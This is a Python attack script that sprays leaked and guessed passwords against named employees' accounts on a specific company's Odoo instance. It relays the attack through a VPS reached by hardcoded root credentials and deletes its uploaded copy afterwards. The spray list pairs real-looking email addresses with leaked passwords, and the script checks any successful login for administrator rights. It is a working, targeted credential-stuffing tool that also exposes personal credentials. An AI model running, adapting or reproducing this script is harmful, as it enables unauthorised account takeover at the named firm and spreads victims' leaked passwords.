"""R2 Capital - Spray leaked passwords on Odoo admin accounts"""
import paramiko, json

VPS_IP = "82.27.100.115"
VPS_PW = "37W92I_Wd9581g5j1g1LzI"

REMOTE_SCRIPT = r"""
import json, sys, ssl, time, re
from urllib.request import Request, urlopen, build_opener, HTTPCookieProcessor
from urllib.parse import urlencode
from http.cookiejar import CookieJar

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

BASE = "https://r2-r2capital.odoo.com"
DB   = "adrianr2capital-r2capital-production-9575492"

SPRAY = [
    ("diego.pereyra@r2.co", ["009Fbc9A3c1aB1fC2123861e8aE073", "23173184", "88TUris",
     "Diego2022*", "Diego2023*", "Diego2024*", "Diego2025*", "Diego2026*",
     "R2capital2022*", "R2capital2023*", "R2Capital2024*", "Pereyra2022*"]),
    
    ("cesar.sepulveda@r2capital.co", ["igk1zd1982", "cesar123",
     "Cesar2022*", "Cesar2023*", "Cesar2024*", "Cesar2025*", "Cesar2026*",
     "R2capital2022*", "CesarSep2022*"]),
    
    ("fabrizio.albanese@r2capital.co", ["palermo1", "arone220873", "magicbox",
     "Fabrizio2022*", "Fabrizio2023*", "Palermo2022*", "Albanese2022*",
     "R2capital2022*"]),
    
    ("ivan.garcia@r2capital.co", ["666180693", "mellamoivan15", "ikea92", "Txuriurdin74",
     "Ivan2022*", "Ivan2023*", "Ivan2024*", "Ivan2025*", "Ivan2026*",
     "R2capital2022*", "Garcia2022*"]),
    
    ("e@mawii.com.co", ["wvrapper", "11111", "Nice166797", "alexander", "24augustus",
     "cml19920224", "Mawii2022*", "Mawii2023*"]),
    
    ("ignacio.cabaud@r2capital.co", ["R2capital2022*", "R2capital2023*", "R2Capital2024*",
     "Ignacio2022*", "Cabaud2022*"]),
    
    ("jjmtechsolutions@gmail.com", ["JJCpr205", "JC258200", "Jc258200.",
     "JJMtech2022*", "JJM2022*"]),
    
    # Bonus: non-admin users with leaked creds (might have different perms)
    ("jc.juarez@r2capital.co", ["JJCpr205", "WMuqyW38xPL*rP9", "JC258200",
     "wTKXX@dNkb5xvM3", "Solocqncnstes3."]),
    ("jc.juarez@r2.co", ["Jc258200.", "JJCpr205", "WMuqyW38xPL*rP9"]),
    ("operaciones@r2capital.co", ["Hello2022*", "CuOpsr2*"]),
    ("natalia.calle@r2capital.co", ["Azsx2022*"]),
]

def rpc_login(db, user, pwd):
    payload = json.dumps({
        "jsonrpc": "2.0", "id": 1, "method": "call",
        "params": {"service": "common", "method": "login", "args": [db, user, pwd]}
    }).encode()
    req = Request(BASE + "/jsonrpc", data=payload,
                  headers={"Content-Type": "application/json"})
    resp = urlopen(req, timeout=20, context=ctx)
    r = json.loads(resp.read().decode())
    uid = r.get("result")
    if uid and uid is not False and uid != 0:
        return uid
    return None

print("=" * 60)
print("R2 CAPITAL - ADMIN CREDENTIAL SPRAY")
print("=" * 60)

hits = []
total = sum(len(pwds) for _, pwds in SPRAY)
done = 0

for user, passwords in SPRAY:
    print(f"\n  [{user}]")
    for pwd in passwords:
        done += 1
        try:
            uid = rpc_login(DB, user, pwd)
            if uid:
                print(f"    >>> HIT! pwd={pwd} UID={uid} <<<")
                hits.append({"user": user, "password": pwd, "uid": uid})
            else:
                print(f"    --- {pwd}")
        except Exception as e:
            err = str(e)[:80]
            print(f"    err {pwd} -> {err}")
        time.sleep(0.3)

print(f"\n{'='*60}")
print(f"RESULTS: {len(hits)} hits out of {total} attempts")
print(f"{'='*60}")

for h in hits:
    print(f"  {h['user']} | pwd={h['password']} | UID={h['uid']}")

# If we got an admin hit, enumerate their permissions
for h in hits:
    uid = h["uid"]
    apikey = h["password"]
    print(f"\n  Checking UID {uid} permissions...")
    try:
        payload = json.dumps({
            "jsonrpc": "2.0", "id": 1, "method": "call",
            "params": {"service": "object", "method": "execute_kw",
                       "args": [DB, uid, apikey, "res.users", "read", [[uid]],
                                {"fields": ["name", "login", "groups_id"]}]}
        }).encode()
        req = Request(BASE + "/jsonrpc", data=payload,
                      headers={"Content-Type": "application/json"})
        resp = urlopen(req, timeout=20, context=ctx)
        r = json.loads(resp.read().decode())
        user_data = r.get("result", [{}])[0]
        groups = user_data.get("groups_id", [])
        is_admin = 3 in groups  # group 3 = Administration/Settings
        print(f"  Name: {user_data.get('name')}")
        print(f"  Groups: {len(groups)}")
        print(f"  IS ADMIN (group 3): {is_admin}")
        if is_admin:
            print(f"  >>> ADMIN ACCESS CONFIRMED! <<<")
    except Exception as e:
        print(f"  Check error: {e}")

if not hits:
    print("\n  No hits. Passwords changed from leaked versions.")

print("\nDone")
"""

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(VPS_IP, username="root", password=VPS_PW, timeout=10,
               look_for_keys=False, allow_agent=False)

sftp = client.open_sftp()
with sftp.open("/tmp/r2cap_spray.py", "w") as f:
    f.write(REMOTE_SCRIPT)
sftp.close()

print("[+] Spraying on VPS...")
stdin, stdout, stderr = client.exec_command("python3 /tmp/r2cap_spray.py", timeout=300)
print(stdout.read().decode(errors="replace"))
err = stderr.read().decode(errors="replace")
if err:
    print(f"STDERR: {err[:1000]}")

client.exec_command("rm -f /tmp/r2cap_spray.py")
client.close()
